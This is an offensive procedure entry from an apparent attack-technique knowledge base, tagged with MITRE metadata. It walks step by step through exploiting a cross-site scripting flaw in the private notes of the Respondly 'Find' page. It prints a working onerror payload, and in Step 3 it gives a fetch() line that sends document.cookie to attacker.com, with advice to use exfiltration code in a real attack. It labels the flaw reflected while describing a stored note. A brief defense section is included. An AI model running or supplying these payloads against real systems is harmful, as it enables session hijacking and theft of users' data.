---
tags:
  - xss
  - javascript
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:36.201Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: f9b490f7-0a40-4e88-bd1d-e136c05166da
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-in-Respondly-Private-Notes

## Summary

This procedure exploits a reflected Cross-site Scripting (XSS) vulnerability in the Respondly 'Find' page's private notes feature by injecting a malicious HTML/JavaScript payload, leading to arbitrary code execution in the victim's browser without proper sanitization.

## Description

The vulnerability stems from insufficient input validation and output escaping in the private notes field on the 'Find' page. An attacker with access to the application can insert HTML elements containing JavaScript, such as an onerror handler in an img tag, which executes when the note is rendered. This allows for client-side attacks including alert popups for proof-of-concept, or more severe actions like stealing cookies, session tokens, or performing actions on behalf of the user. The attack requires authentication but targets other authenticated users viewing the note. Expected outcomes include immediate code execution upon note rendering, with potential for data exfiltration or session hijacking.

## Requirements

1. Authenticated session in the Respondly web application
2. Access to the 'Find' page and private notes functionality
3. A modern web browser to observe execution

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding (e.g., using libraries like DOMPurify) for all user-controlled content
- Enable Content Security Policy (CSP) to restrict inline JavaScript execution
- Monitor for anomalous JavaScript events or unexpected popups in browser logs
- Conduct regular security audits and use tools like OWASP ZAP for vulnerability scanning

## Objectives

1. Inject and store malicious JavaScript payload in private notes
2. Execute the payload to demonstrate code injection
3. Highlight risks of session hijacking and data theft in client-side contexts

## Instructions

### Step 1: Access the Find Page and Private Notes

**Context**: Gain entry to the vulnerable interface to prepare for payload insertion.

Log in to Respondly and navigate to the 'Find' page. Locate the private notes input area.

### Step 2: Craft and Insert the Payload

**Context**: Create a simple XSS payload that executes JavaScript on error, exploiting the lack of sanitization.

Enter the following payload into the private notes field:

```html
<img src='x' onerror='alert(4)'>
```

Save or submit the note. The input accepts the HTML without escaping.

> This payload uses a broken image source to trigger the onerror event, executing alert(4) as proof-of-concept. In a real attack, replace with code to exfiltrate document.cookie or perform other actions.

### Step 3: Trigger Execution and Verify

**Context**: Render the note to execute the injected script and confirm the vulnerability.

View the saved private note on the 'Find' page or refresh the view. Observe the alert popup.

> Successful execution shows an alert box with '4'. Check browser developer tools for any executed scripts. For impact testing, modify the payload to log session data: onerror='fetch("https://attacker.com?cookie="+document.cookie)'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[JavaScript]]
- [[web-injection]]
